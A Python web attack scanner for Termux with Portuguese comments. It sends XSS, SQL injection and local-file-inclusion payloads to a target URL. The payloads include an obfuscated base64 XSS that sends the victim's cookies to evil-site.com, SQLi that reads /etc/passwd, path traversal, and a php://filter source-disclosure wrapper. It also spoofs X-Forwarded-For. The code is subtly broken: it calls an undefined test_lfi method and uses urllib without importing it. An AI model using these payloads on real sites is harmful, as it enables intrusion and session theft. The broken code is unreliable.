#!/data/data/com.termux/files/usr/bin/python3
import re
import time
import requests
from urllib.parse import urlparse, quote

class UltimateScanner:
    def __init__(self):
        self.payloads = {
            'xss': [
                # XSS avançado (evasão de WAF)
                '<svg/onload=alert`1`>',
                '<img src="x:x" onerror="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXZpbC1zaXRlLmNvbS9jb2xsZWN0P2M9Jytkb2N1bWVudC5jb29raWU\'))">',
                '%26%2394;img src=x onerror=prompt(1)%26%2394;'
            ],
            'sqli': [
                # SQLi inteligente (time-based + boolean-based)
                "' OR (SELECT 1 FROM pg_sleep(2))--",
                "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
                "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--"
            ],
            'lfi': [
                # LFI com wrappers
                '../../../../etc/passwd%00',
                'php://filter/convert.base64-encode/resource=index.php'
            ]
        }
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'X-Forwarded-For': '192.168.1.1'
        }

    def scan(self, url):
        print(f"\n[+] Iniciando scan ULTIMATE em: {url}")
        self.test_xss(url)
        self.test_sqli(url)
        self.test_lfi(url)
        self.check_headers(url)

    def test_xss(self, url):
        print("\n[++] Testando XSS Avançado...")
        for payload in self.payloads['xss']:
            try:
                # Teste em parâmetros GET
                parsed = urlparse(url)
                params = {k: payload for k in parsed.query.split('&')}
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
                
                r = requests.get(test_url, headers=self.headers, timeout=15)
                if payload.lower() in r.text.lower():
                    print(f"[!] XSS Detectado: {payload}")
                
                # Teste em headers/cookies
                headers = {**self.headers, 'Referer': payload}
                requests.get(url, headers=headers)
                
            except Exception as e:
                continue

    def test_sqli(self, url):
        print("\n[++] Testando SQLi Avançado...")
        for payload in self.payloads['sqli']:
            try:
                start_time = time.time()
                r = requests.get(f"{url}{quote(payload)}", headers=self.headers, timeout=20)
                
                # Time-Based Detection
                if time.time() - start_time > 2:
                    print(f"[!] SQLi (Time-Based): {payload}")
                
                # Error-Based Detection
                elif any(word in r.text.lower() for word in ['error', 'sql', 'syntax']):
                    print(f"[!] SQLi (Error-Based): {payload}")
                    
            except:
                continue

    def check_headers(self, url):
        print("\n[++] Verificando Headers...")
        try:
            r = requests.get(url, headers=self.headers)
            security_headers = {
                'CSP': 'Content-Security-Policy',
                'HSTS': 'Strict-Transport-Security',
                'XSS': 'X-XSS-Protection'
            }
            
            for name, header in security_headers.items():
                if header not in r.headers:
                    print(f"[!] Header de Segurança Ausente: {name}")
                    
        except Exception as e:
            print(f"[-] Erro ao verificar headers: {str(e)}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Uso: python3 ruskscan_ultimate.py http://alvo.com")
        sys.exit()
    
    scanner = UltimateScanner()
    scanner.scan(sys.argv[1])
